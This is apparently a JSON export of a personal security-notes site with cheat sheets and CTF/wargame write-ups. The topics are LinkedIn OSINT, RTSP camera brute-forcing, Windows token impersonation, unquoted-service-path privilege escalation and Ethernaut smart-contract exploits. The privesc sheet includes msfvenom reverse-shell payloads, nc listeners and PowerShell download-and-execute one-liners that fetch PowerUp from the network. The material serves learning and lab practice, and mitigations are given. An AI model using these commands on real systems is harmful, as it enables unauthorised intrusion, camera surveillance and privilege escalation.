{"/":{"title":"üï∏Ô∏è H@kBr4in","content":"\n## Where am I? What's this place?\nWelcome web traveler to a journey inside the mind of a security enthusiast. Here, you'll find a web of linked notes on different techniques \u0026 methodologies that I've developed throughout my journey in understanding and breaking systems. Think of it as an aggregation of stuff I've learnt in CTFs, wargames, real life assessments or just by reading what other researchers are doing.\n\n### Purpose\nI decided to make this space public for various reasons:\n- take a more pro-active approach in giving back to the security community which guided \u0026 thought me everything I know\n- help new comers *(newbies)* to this industry by providing an entry-point of some sort, demystifying seemingly scary concepts\n- supply me with a centralized place acting as a quick reference of tips, tricks \u0026 checklists for future engagements\n- monitor my progress \u0026 share what I'm learning along the way\n\n## How to navigate this site?\nThe best way to navigate a network is by wandering from note to note based on what seems interesting for you. If you want to be more specific you can also directly search for pages on top of the page based on keywords. However, to make things easier for everybody I will link down below some entry points:\n\n\u003e üí° Don't forget to check the map on the bottom of the page as well\n\n### Current [tags](/tags/)\n- `#writeups`: any note on challenges, CTFs, labs or anything of that nature can be found here, summarizing my experience, how I've completed it \u0026 what I've learned\n- `#sheets`: general notes on different topics\n- `#moc`: [maps of content](https://www.youtube.com/watch?v=WUq8Pun28FI) act as an index, roots branching off into more granular levels of detail. It's a more organic structure rather than a synthetic classification of folders to form \u0026 store knowledge\n\n### Write-Ups\n- [[write-ups/THM|TryHackMe]]\n- [[write-ups/HTB|HackTheBox]]\n- [[write-ups/Ethernaut Wargame|Ethernaut]]\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/sheets/LinkedIn-OSINT":{"title":"LinkedIn OSINT","content":"\n# LinkedIn OSINT\n\n- use [Google Dorks](Google%20Dorks): `site:http://linkedin.com/in ‚Äú\u003ckeywords of interest\u003e‚Äù` *(e.g name, organization, job title)*\n- take note of the profile name *(`https://www.linkedin.com/in/profile_name`)*\n\t- if they decide to change their names, hide their surname or lock down their profile, you still have an entry point\n\t- oftenly users have a profile which closely resembles their user name from Linkedin on other platforms: `site:fb.com ‚Äúwilliamhgates‚Äù OR ‚Äúwilliam gates‚Äù OR ‚Äúwilliamgates‚Äù`\n- view the profile graphic elements \u0026 use image search engines\n\t- `wget /in/username/detail/photo/` to get it\n\t- Some image search engines\n\t\t- [Google Images](https://www.google.com/imghp?hl=en)\n\t\t- [Yandex Images](https://yandex.com/images/)\n\t\t- [Flickr](https://www.flickr.com/search/)\n\t\t- [Shutterstock](https://www.shutterstock.com/)\n\t\t- [Getty Images](https://www.gettyimages.co.uk/)\n\t\t- [Tin Eye](https://tineye.com/)\n- manual detail search\n\t- `https://www.linkedin.com/search/results/people/?firstName=[_name_]\u0026keywords=[_name_]%20[_surname_]\u0026lastName=[_surname_]`\n\t- or even more ellaborate: `https://www.linkedin.com/search/results/people/?firstName=[_name_]\u0026lastName=[_surname_]\u0026company=[_company name_]\u0026title=[job title]`\n- check the profile's recent activity @ `https://www.linkedin.com/in/username/detail/recent-activity/`\n\t- activity associated w the user can be: articles, posts, documents\n- use 3rd party tools *(e.g [linkedin-api lib 4 python](https://github.com/tomquirk/linkedin-api))*\n- use the *\"Save to PDF\"* feature\n\n\u003e Made a quick tool: check it out in [this gist](https://gist.github.com/vlagh3/8ef7055aa74d47d7ed6fddc1001d58e8)\n\n\n---\n\n## References\n[How to conduct OSINT on Linkedin](https://www.osintme.com/index.php/2020/04/26/how-to-conduct-osint-on-linkedin/)\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/sheets/RTSP-CCTV-Cam-Testing":{"title":"RTSP CCTV Cam Testing","content":"\n## What is RTSP ?\nThe Real Time Streaming Protocol is an application-level used in entertainment and communications systems to control streaming media servers. Similar to **HTTP**, clients can issue commands such as: play, record, pause, etc. It's commonly used by IP cameras.\n\n**Default ports**: `554`, `8554`, `5554`\n**Syntax**: `rtsp://user:password@ip:port/route`\n\n\n## Enumeration\n- `nmap` has some convenient scripts when it comes to attacking RTSP. So just run them: `nmap -sV --script \"rtsp-*\" -p \u003cPORT\u003e \u003cIP\u003e`\n\t- ![[write-ups/images/Pasted image 20220805163325.png]]\n\t- the output will give you possible valid methods and URLs that are supported\n\t- ![[write-ups/images/Pasted image 20220805163532.png]]\n- can also manually confirm it with `curl -i -X OPTIONS rtsp://\u003cIP\u003e:\u003cPORT\u003e/\u003cROUTE\u003e`\n\t- a valid RTSP response should look similar to this\n\t\t```bash\n\t\tRTSP/1.0 200 OK\n\t\tCSeq: 1\n\t\tDate: Tue, Dec 08 2020 09:56:12 GMT\n\t\tPublic: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, GET_PARAMETER, SET_PARAMETER\n\t\t```\n\t\n\n## Brute-Force\n- Basic auth with python\n\t- to create a basic auth req, we can use the `DESCRIBE` method \u0026 base64 encode our username/password\n\t\t```bash\n\t\tDESCRIBE rtsp://\u003cip\u003e:\u003cport\u003e RTSP/1.0\\r\\nCSeq: 2\\r\\nAuthorization: Basic YWRtaW46MTIzNA== # admin:1234\n\t\t```\n\t- some python-fu  to automatically try this\n\t\t```python\n\t\timport socket\n\t\tfrom base64 import b64encode\n\t\n\t\tHOST  = \"192.168.1.1\"\n\t\tPORT  = 554\n\t\tCREDS = \"admin:1234\"\n\t\n\t\treq = f\"DESCRIBE rtsp://\u003cip\u003e:\u003cport\u003e RTSP/1.0\\r\\nCSeq: 2\\r\\nAuthorization: Basic {b64encode(CREDS)}\\r\\n\\r\\n\"\n\t\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\ts.connect((HOST, PORT))\n\t\ts.sendall(req)\n\t\n\t\tdata = s.recv(1024)\n\t\tprint(data)\n\t\t```\n\n### Even Easier\nif you don't want to do this manually / create your own scripts, the community got you\n- [rtsp_authgrinder.py](https://github.com/Tek-Security-Group/rtsp_authgrinder) quick / simple tool to brute force credentials on RTSP services\n- [cameradar](https://github.com/Ullaakut/cameradar): an all-in-one tool which allows you to: detect open RTSP hosts, detect device model, launch dictionary attacks on routes \u0026 credentials\n\t- `cameradar -r routes.txt -t 192.168.1.131 -v -p 554 -c creds.json`\n\t- `docker run -t ullaakut/cameradar -t \u003ctarget\u003e \u003cother command-line options\u003e`\n\n## Seeing the RTSP Stream\n```bash\nffplay -loglevel 32 -rtsp_transport tcp -i rtsp://:@192.168.1.131/ -probesize 32 -analyzeduration\nmpv rtsp://192.168.1.131/live.sdp\ncvlc rtsp://192.168.1.131/Streaming/Channels/1\n```\n\n\n## Refs\n- [Haktricks Pentesting rtsp](https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp)\n- [Real Time Streming Protocol RFC](https://www.rfc-editor.org/rfc/rfc2326.html)\n- [RTSP Brute Forcing for fun and naked pictures?](https://web.archive.org/web/20161020202643/http://badguyfu.net/rtsp-brute-forcing-for-fun-and-naked-pictures/)\n- [Can't access cam with custom route isssue](https://github.com/Ullaakut/cameradar/issues/142)\n\n## See Also","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/sheets/Token-Impersonation":{"title":"Token Impersonation","content":"\n## Description\nAdversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using¬†`DuplicateToken(Ex)`. The token can then be used with¬†`ImpersonateLoggedOnUser`¬†to allow the calling thread to impersonate a logged on user's security context, or with¬†`SetThreadToken`¬†to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\n[Source](https://attack.mitre.org/techniques/T1134/001/)\n\n\n## Techniques\n\n### Check [Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)\nGet a table of priviliges for the current user *(name, description \u0026 state : enabled/disabled)*\n```bash\nwhoami /priv\n```\n\nThe privileges of an account *(which are either given to the account when created or inherited from a group)* allow a user to carry out particular action. [Priv2Admin](https://github.com/gtworek/Priv2Admin) has a great table on privileges of interest that can be abused. \n\n\n\n### Metasploit\n```bash\n# Load token module\nload incognito\n\n# List available tokens\nlist_tokens -g\n\n# Impersonate token\nimpersonate_token \u003ctoken_name_from_above\u003e\n\n# Revert to original token\nrev2self\n```\nA good example of seeing this in action is in the [Alfred THM room](Alfred.md#Privesc)\n\n## Refs\n- [McAfee Accesss Token Theft Manipulation Attacks](https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf)\n- [Abusing Token Privileges for LPE](https://www.exploit-db.com/papers/42556)\n- [Client Impersonation microsoft docs](https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation)\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/sheets/Unqoted-Service-Paths":{"title":"Unqoted Service Paths","content":"\nWhen a¬†**service**¬†is created whose¬†**executable path**¬†contains¬†**_spaces_**¬†and isn‚Äôt enclosed within¬†**_quotes_**, leads to a vulnerability known as Unquoted Service Path which allows a user to gain¬†**SYSTEM**¬†privileges *(only if the vulnerable service is running with SYSTEM privilege level which most of the time it is)*. This happens due to how Windows handles spaces: if the service is not enclosed within quotes \u0026 is having spaces =\u003e it would handle the space as a break and pass the rest of the service path as an argument.\n\n\n## Root Cause\nThis is caused by the [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function which creates a new process. More specifically the `lpApplicationName` string parameter which can be the full path / filename of the module to be executed. If the filename is a long string spanning acrosss multiple sub directories, contains spaces and is not enclosed in quotation marks, it will be executed in the order from left to right until the space is reached \u0026 will append `.exe` @ the end of this spaced path. \n\n### Example\n- Consider the following path: `C:\\Program Files\\A Sub\\B Sub\\C Sub\\executeMe.exe`\n- In order to run `executeMe.exe` the Windows API will interpret it in the following order\n\t- `C:\\Program.exe`\n\t- `C:\\Program Files\\A.exe`\n\t- `C:\\Program Files\\A Sub\\B.exe`\n\t- `C:\\Program Files\\A Sub\\B Sub\\C.exe`\n\t- `C:\\Program Files\\A Sub\\B Sub\\C Sub\\executeMe.exe`\n- If `Program.exe` is not found, then `A.exe` will be executed and so on\n\n\n\n## CheckList\n- [ ] List all unquoted service paths *(minus built-in Windows services)*. Are there any available?\n\t```bash\n\twmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n\twmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\system32\\\\\" |findstr /i /v \"\"\"\n\tgwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name # (PS)\n\t```\n- [ ] With what priviliges is the targetted service running *(should be as `LocalSystem`)* \u0026 what's the absolute path of the executable ?\n\t```bash\n\tsc qc \u003cservice-name\u003e \n\t# Look for the following\n\t#  START_TYPE is it AUTO_START?\n\t#  BINARY_PATH_NAME\n\t#  SERVICE_START_NAME\n\t```\n- [ ] Does your user have write access in one of the folders where the binary path resides?\n\t```bash\n\t# Do this for every one of them \n\ticacls \"C:\\path\\to\\dir\\of\\your\\subdir\"\n\tGet-acl 'C:\\path\\to\\dir' | % {$_.access}   # (PS)\n\t# Looking for write acesss on one of your groups (e.g BUILTIN\\Users)\n\t```\n- [ ] Do u have the rights to restart the service? If not, it should be an auto-start service so that upon rebooting the system it communicates with the [Service Control Manager](https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager) \u0026 gets your payload executed\n\t```bash\n\t# If you're confused about what this command spits out\n\t# check out this: http://woshub.com/set-permissions-on-windows-service/\n\tsc sdshow \u003cservice-name\u003e\n\t```\n\n## Exploitation\nConsidering that we have a low privilege shell already on the target system \u0026 all of the requirments above are met. Then we can just drop our malicious executable `B.exe` in `C:\\Program Files\\A Sub\\`. When the system boots, Windows auto starts some of its services.¬†Services on Windows communicate with the¬†[_Service Control Manager_](https://en.wikipedia.org/wiki/Service_Control_Manager)¬†which is responsible to start, stop and interact with these service processes. It starts this service with whatever privileges it has to run, thus letting us run whatever we want as `SYSTEM`*(read more [here](https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco) about differences between accounts \u0026 privileges)*\n\n\u003e For a more concrete example check out [[write-ups/thm/Steel Mountain#Privesc w Unquoted Service Path]] \n\n### Manual\n```bash\n# Generate payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=1337 -f exe -o B.exe\n\n# Transfer to target\n\n# through impacket's smb server\nhost: python /usr/share/doc/python-impacket/examples/smbserver.py sharedfolder .\ntarget: copy \\\\LHOST\\sharedfolder\\B.exe .\n# or powershell\npowershell -Command Invoke-WebRequest -Uri http://LHOST/B.exe -OutFile B.exe\n\n# Start listener \nnc -nvlp 1337\n\n# Restart service \u0026 profit\nsc stop \u003cservice-name\u003e\nsc start \u003cservice-name\u003e\n# if access is denied just reboot\nshutdown /r /t 0\n```\n\n\n### Metasploit\n\n```bash\n# Setup listener\nuse exploit/multi/handler  \nset payload windows/meterpreter/reverse_tcp  \nset lhost \u003cip\u003e\nset lport \u003cport\u003e\nexploit -j\n\n# Exploit\nuse exploit/windows/local/trusted_service_path  \nset session 1  \nexploit\n```\n\n### PowerSploit\n- Get a local copy of [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)\n```bash\n# Setup local http/smb server to serve PowerUp\n\n# Call Get-ServiceUnquoted from PowerUp without touching the disk\npowershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1');Get-ServiceUnquoted\"\n\n# Checks for every spaced path, whether the context of the cmd shell  have write/modify access or not.\npowershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Get-ChildItem C:\\ -Recurse | Get-ModifiablePath\"\n\n# patches the command given to it as an argument to the pre-compiled C# executable service binary to the specified path.\npowershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Write-ServiceBinary -Name 'Some Vulnerable Service' -Command '\\\\LHOST\\sharedfolder\\B.exe' -Path 'C:\\Program Files\\A Subfolder\\B.exe'\"\n```\n\n\n## Lab Environment Setup\n\n### Creating users\n```bash\n# Create a new user \u0026 add him to the Administrators group\nnet user dumbadmin /add\nnet localgroup Administrators dumbadmin /add\nnet localgroup Users dumbadmin /delete\n\n# Create a low-privileged user\nnet user normie /add\n```\n\nThis is what you should have now\n\n![[write-ups/images/Pasted image 20220821085517.png]]\n\n### Deploy vulnerable service\nLogin as the `dumbadmin` user \u0026 spawn a priviliged command prompt, then use [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) to create the service\n```bash\nsc create \"Vulnerable Service\" binpath= \"C:\\Program Files\\A Sub\\B Sub\\C Sub\\ape.exe\" Displayname= \"Service Vuln to Unqoted Service Path\" start= auto\n```\n\nNow create the folders \u0026 assign write permissions to `BUILTIN\\Users` on `A Sub` or `B Sub` using [icacls](https://ss64.com/nt/icacls.html)\n```bash\nmkdir \"C:\\Program Files\\A Sub\\B Sub\\C Sub\"\nicacls \"C:\\Program Files\\A Sub\"\nicacls \"C:\\Program Files\\A Sub\" /grant \"BUILTIN\\Users\":W\n```\n\n![[write-ups/images/Pasted image 20220821090209.png]]\n\nThe part we're interested in is the first line: `A Sub BUILTIN\\Users:(W)`. This confirms that any normal users have write access to the `A Sub` directory\nTo finally verify that everything is running as expected we can find every service which isn't enclosed in double quotes\n\n![[write-ups/images/Pasted image 20220821090532.png]]\n\n## Mitigation\nGets all the services from¬†`HKLM\\SYSTEM\\CurrentControlSet\\services` \u0026 find those services with spaces and without quotes, prepends and appends double quotes to the service binary executable and fixes it.\n\n## Refs\n- [Windows Privilege Escalation ‚Äî Part 1 (Unquoted Service Path)](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)\n- [Hijack Execution Flow: Path Interception by Unqoted Path -- MITRE](https://attack.mitre.org/techniques/T1574/009/)\n\n## See Also","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/sheets/Windows-11-Minimum-Requirments-Bypass":{"title":"Windows 11 Minimum Requirments Bypass","content":"\nI recently stumbled upon this error in VirtualBox when trying to setup Windows 11\n```\nThis computer does not meet the minimum system requirements to install this version of Windows.\n```\nEven though it had 8GB RAM, 100GB storage and 4 CPU cores ü§î\nJust press `Shift + F10` which should spawn a command prompt. Then `regedit` and prepare yourself to make some changes\n- go to `HKEY_LOCAL_MACHINE\\System\\Setup`, right-click \u0026 `New -\u003e Key` *(`LabConfig` as name)*\n- Inside the `LabConfig` create 4 `New -\u003e DWORD (32-bit) Value` \u0026 set them all to hex value `1`\n\t-   BypassTPMCheck\n\t-   BypassSecureBootCheck\n\t-   BypassRAMCheck\n\t-   BypassCPUCheck\n- ![[write-ups/images/Pasted image 20220821074413.png]]\n\nClose everything down, click the `X` \u0026 run the installation from the start again meaning without doing any reboots\n\n## Refs\n- [How to fix Windows 11 'does not meet the requirements' error on VirtualBox](https://devcoops.com/fix-windows-11-virtualbox-error/)","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/Ethernaut-Wargame":{"title":"Ethernaut Wargame","content":"\n\u003e Ethernaut is a Web3/Solidity based wargame inspired by¬†[overthewire](https://overthewire.org/), to be played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.\n\u003e \n\u003e The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks as levels. There can be an infinite number of levels and the game does not require to be played in any particular order.\n\nProvided for us by [OpenZeppelin](https://www.openzeppelin.com/) this set of challenges are mandatory for anybody trying to get started in understanding how attacks on the blockchain work\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/HTB":{"title":"HTB","content":"\nOne of the earliest platforms in the game, [HackTheBox](https://www.hackthebox.com/) has a wide-range of machines to hack \u0026 practice your skills in pretty much every aspect of cybersecurity. With most of the boxes it has a [[black-box approach]] similar to the one's found in the real world. I would recommend this platform to everyone to practice on, from beginners to intermediate to elite users.\n\nAs time went on, the platform scaled-up \u0026 is now providing an array of services / features:\n- [HTB Academy](https://academy.hackthebox.com/): learn hacking in a more guided way. Here you'll be able to better pick [the path](https://academy.hackthebox.com/catalogue/paths) you want to specialize in. It also provides you a [certification](https://academy.hackthebox.com/preview/certifications) which always can come in handy\n- [Challenges](https://app.hackthebox.com/challenges): taking an approach similar to CTFs, they provide multiple challenges on specific sub-domains *(e.g mobile, web, pwn, reversing, forensics)*\n- [BattleGrounds](https://app.hackthebox.com/battlegrounds): a real-time game of strategy and hacking, where two teams of 1, 2 or 4 people each battle for supremacy over the environment. This is quite challenging \u0026 I would recommend it to give it a try after you have the basics on point\n- [Pro-Labs](https://app.hackthebox.com/prolabs): real-world hacking lab simulations\n\nBelow, you'll find my experience on the platform \u0026 what challenges I've been tackling ü§†\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/THM":{"title":"THM","content":"\n\nA training platform for begginers \u0026 intermediate wanderers. It provides you with different rooms specialized on a niche topic *(e.g CVE, networking basics, web-app security)*, most of them having custom virtual machines that need to be solved through walkthroughs.\n\nBesides that it also provides you \n- with different [learning paths \u0026 modules](https://tryhackme.com/hacktivities) that certify you\n- simulations of [real-world networks](https://tryhackme.com/network/throwback) to play around with\n- custom games of CTFs \u0026 [king of the hill](https://tryhackme.com/games/koth) which turn hacking into fun\n- the option to develop your own rooms \u0026 contribute back to the community\n\nUnder this section you will mostly find my notes \u0026 write-ups that I took while completing different rooms.\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/ethernaut/coinflip":{"title":"4. CoinFlip","content":"\n- used [mythrill](https://github.com/ConsenSys/mythril) for static analysis on EVM bytecode: `myth a CoinFlip.sol`\n\t- make sure you store your contracts locally *(`coinFlip.sol` \u0026 dependencies: `SafeMath.sol`)* \n\t- control flow decision is made based on the block hash of a previous block\n- we might be able to guess every time by having control over how the `blockValue` is determined, so let's look @ the contract\n\n## Disecting the contract\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract CoinFlip {\n\n    using SafeMath for uint256;\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    // it's actually 2^255\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    // Setup the counter to 0\n    constructor() public {\n      consecutiveWins = 0;\n    }\n\n\n    // give a bool, get bool back\n    function flip(bool _guess) public returns (bool) {\n      // block.number: the curr block nr\n      // blockhash(): hash of the given block ‚Äî only for 256 most recent blocks\n      // look @ the nr of the prev block, get hash \u0026 cast to uint256\n      uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n\n      // check for multiple txs  on the same block  \n      // and let through only the first one\n      if (lastHash == blockValue) {\n        // undo all state changes, but handled \n        // differently than an `invalid opcode`\n        //   - allows youo to return value\n        //   - or refund remaining gas to caller\n        revert();\n      }\n      // set the lastHash based on blockValue\n      // ! it's entirely dependent on the block tx is included on\n      lastHash = blockValue;\n      \n      // btw: 3 / 4 = 0 in solidity\n      // so we should get only 1 or 0\n      uint256 coinFlip = blockValue.div(FACTOR);\n      bool side = coinFlip == 1 ? true : false;\n\n      // compare pseudo random flip result with\n      // user's guess \u0026 adjust wins accordingly\n      if (side == _guess) {\n        consecutiveWins++;\n        return true;\n      } else {\n        consecutiveWins = 0;\n        return false;\n      }\n    }\n}\n```\n\n## Exploitation\n**Every single transaction in the same block can determine the same `blockValue` =\u003e evaluate the *coinflip* result**. \n\nHow we could do that ? As always the best way to attack a smart contract is with another smart contract :))\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nusing SafeMath for uint256;\n\ncontract CoinFlip {\n\t...\n}\n\ncontract angryApe {\n  CoinFlip public flipper; // instance of target contract\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  bool public guess; // make guess accesible\n\n  // init connection to the target contract\n  constructor() {\n    flipper = CoinFlip(0x37b29A2b9d16b4d005EfcEce415e555C5FD2cf71);\n  }\n\n  // sometimes you can cheat\n  function cheat() public returns(bool) {\n    // calculate blockValue, flip \u0026 get your guss\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n    uint256 flip       = blockValue.div(FACTOR);\n    guess   = flip == 1 ? true : false;\n\n    // send to target contract\n    flipper.flip(guess);\n    return true;\n  }\n}\n```\n\nThe only thing left to be done is to spam the `cheat()` function\n\u003e *is there any way to automate this?*\n\n\n## Takeaways\n\u003e  \"This property of Proof of Work based consensus is one of the greatest obstacles to achieving truly random outcomes on the blockchain. Think on that before building a decentralized lotto ü§ë\"\n- generating random numbers in solidity can be tricky, since everything in smart contracts i publicly visible *(including the local `private` vars)*\n- whenever developing a smart contract keep in mind that miners also have control over things like: blockhashes, timestamps \u0026 whether to include certain txs\n### Mitigation\n- to get cryptographically proven random numbers, you can use¬†[Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.\n- other options include using Bitcoin block headers *(verified through¬†[BTC Relay](http://btcrelay.org/))*,¬†[RANDAO](https://github.com/randao/randao), or¬†[Oraclize](http://www.oraclize.it/)).\n\n## See Also\n- [[write-ups/Ethernaut Wargame]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/ethernaut/fallout":{"title":"2. Fallout","content":"\n![[write-ups/images/fallback_contract.png]]\n\n-   notice that the constructor of the smart contract is misspelled:¬†`Fal1out()`¬†=\u003e made available as a public function\n-   can be also seen in ABI:¬†`console.table(contract.abi)`\n-   so just call it \u0026 claim ownership:¬†`await contract.Fal1out()`\n\n## Takeaways\n-  you might say that this was to silly to happen in the wilderness of the real world. Well... not quite, it happen with¬†[Rubix](https://www.rubix.net/), where the company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:\n    \n    ```solidity\n    contract Rubixi {\n      address private owner;\n      function DynamicPyramid() { owner = msg.sender; }\n      function collectAllFees() { owner.transfer(this.balance) }\n      ...\n    ```\n    \n    -   as such, an attacker could call the old constructor \u0026 claim ownership\n-   Practice test driven development\n-   [Use security analysis tools](https://consensys.github.io/smart-contract-best-practices/security_tools/), which are usually free and good at finding simple human errors\n\n## See Also\n- [[write-ups/Ethernaut Wargame]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/ethernaut/hello_ethernaut":{"title":"0. Hello Ethernaut","content":"\n- `help()` to see functions\n- get instance, check `contract`\n## Solving\n```javascript\nawait contract.info()\nawait contract.info1()\nawait contract.info2(\"hello\")\nawait contract.infoNum() // 42\nawait contract.info42()\nawait contract.theMethodName() // method 7123949\nawait contract.method7123949()\nawait contract.password() // ethernaut0\nawait contract.authenticate(\"ethernaut0\")\n// submit level instance \u0026 proc tx\n```\n- smart contract code\n\t```solidity\n\t// SPDX-License-Identifier: MIT\n\tpragma solidity ^0.6.0;\n\n\tcontract Instance {\n\n\t  string public password;\n\t  uint8 public infoNum = 42;\n\t  string public theMethodName = 'The method name is method7123949.';\n\t  bool private cleared = false;\n\n\t  // constructor\n\t  constructor(string memory _password) public {\n\t\tpassword = _password;\n\t  }\n\n\t  function info() public pure returns (string memory) {\n\t\treturn 'You will find what you need in info1().';\n\t  }\n\n\t  function info1() public pure returns (string memory) {\n\t\treturn 'Try info2(), but with \"hello\" as a parameter.';\n\t  }\n\n\t  function info2(string memory param) public pure returns (string memory) {\n\t\tif(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {\n\t\t  return 'The property infoNum holds the number of the next info method to call.';\n\t\t}\n\t\treturn 'Wrong parameter.';\n\t  }\n\n\t  function info42() public pure returns (string memory) {\n\t\treturn 'theMethodName is the name of the next method.';\n\t  }\n\n\t  function method7123949() public pure returns (string memory) {\n\t\treturn 'If you know the password, submit it to authenticate().';\n\t  }\n\n\t  function authenticate(string memory passkey) public {\n\t\tif(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {\n\t\t  cleared = true;\n\t\t}\n\t  }\n\n\t  function getCleared() public view returns (bool) {\n\t\treturn cleared;\n\t  }\n\t}\n\t```\n\n## Takeaways\n- all functions \u0026 variables stored on the blockchain are viewable by the public\n- Thus, never store sensitive data *(i.e password)* directly inside a smart contract *(not even as `private` vars even)*\n\n## See Also\n- [[write-ups/Ethernaut Wargame]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/ethernaut/telephone":{"title":"5. Telephone","content":"\n- [diff between tx.origin \u0026 msg.sender](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)\n\t- `msg.sender`\n\t\t- gives direct sender of the msg *(user wallet or another smart contract)*\n\t\t- checks where the external function call directly came from\n\t- `tx.origin`\n\t\t- original user wallet that initialized the tx\n\t\t- the origin addr of potentially an entire chain of txs \u0026 calls\n\t\t- `tx.origin` can be only user wallets, not contract ones\n\n## Exploitation\n- We can trick the `(tx.origin != msg.sender)` by spoofing `msg.sender`\n\t- `tx.origin` will be our user address *(i.e `owner` from `PhoneChain`)*\n\t- `msg.sender` will be the address of the attacking contract\n\t- thus bypassing the check\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() public {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    // change the owner based on tx.origin\n    // we can spoof this\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n\ncontract PhoneChain {\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function claimOwnership() payable public{\n    Telephone(0x9F728A9a2B2c6AC2A008F828086DB24FF5e5fA9d).changeOwner(owner);\n  }\n}\n```\n\n## Takeaways\n- confusing¬†`tx.origin`¬†with¬†`msg.sender`¬†can lead to phishing-style attacks, such as¬†[this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/)\n\t- use¬†`tx.origin`¬†to determine whose tokens to transfer\n\t\t```solidity\n\t\tfunction transfer(address _to, uint _value) {\n\t\t\ttokens[tx.origin] -= _value;\n\t\t\ttokens[_to] += _value;\n\t\t}\n\t\t```\n\t- attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract\n\t\t- `tx.origin`: victim addr while `msg.sender` is the malicious contract's addr\n\t\t- results in funds being transferred from the victim to the attacker\n\t\t```solidity\n\t\tfunction () payable {\n\t\t\ttoken.transfer(attackerAddr, 10000);\n\t\t}\n\t\t```\n- don't use `tx.origin` for authentication purposes\n\n## Refs\n- [Contracts using tx.origin for auth are vulnerable](https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing)\n- [Phising with tx.origin](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)\n\n## See Also\n- [[write-ups/Ethernaut Wargame]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/htb/craft":{"title":"Craft","content":"\n![](https://i.imgur.com/DOJzRQ6.png)\n\n## Recon\n\n\nAfter running `nmap` we get:\n```bash\n# Nmap 7.80 scan initiated Fri Nov 22 09:31:03 2019 as: nmap -sC -sV -oA mango 10.10.10.162\nNmap scan report for 10.10.10.162\nHost is up (0.14s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.6p1 